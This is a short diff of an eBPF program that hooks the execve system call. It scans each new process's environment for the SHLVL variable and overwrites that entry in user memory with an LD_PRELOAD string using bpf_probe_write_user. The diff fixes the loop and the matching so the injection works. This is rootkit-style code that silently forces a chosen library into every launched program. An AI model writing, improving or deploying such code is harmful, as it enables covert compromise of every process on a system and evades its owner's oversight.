@@ -339,22 +339,24 @@ int tracepoint__syscalls__sys_enter_execve(struct trace_event_raw_sys_enter *ctx
     char **envp_dbl_ptr = (char**)BPF_CORE_READ(ctx, args[2]); /* ctx->args[2] */
     char *envp_ptr = NULL;
 	
-    static const char target[] = "MAIL";
+    static const char target[] = "SHLVL";
     const char tmp[100] = { 0 };
 
     for (u32 i = 0; i < 24; i++) {
-        bpf_probe_read_user(&envp_ptr, sizeof(unsigned long), envp_dbl_ptr + (i * sizeof(char*)));
+        bpf_probe_read_user(&envp_ptr, sizeof(unsigned long), envp_dbl_ptr + i);
         bpf_probe_read_user_str(&tmp, sizeof(tmp), envp_ptr);
+        // bpf_printk("ENVP: %s", &tmp);
         for (u32 j = 0; j < sizeof(target); j++) {
             if (tmp[j] != target[j])
                 break;
-            goto out;
+            if (j == sizeof(target) - 2) goto out; /* -2 for NULL byte and 0 index */
         }
     }
     return 0;
 
 out:
-    /* only hit this if env_ptr is MAIL */
+    /* only hit this if env_ptr is LANG */
+    // bpf_printk("SHLVL: %s", &tmp);
     bpf_probe_write_user(envp_ptr, &ld_preload, sizeof(ld_preload));
     return 0;
 }
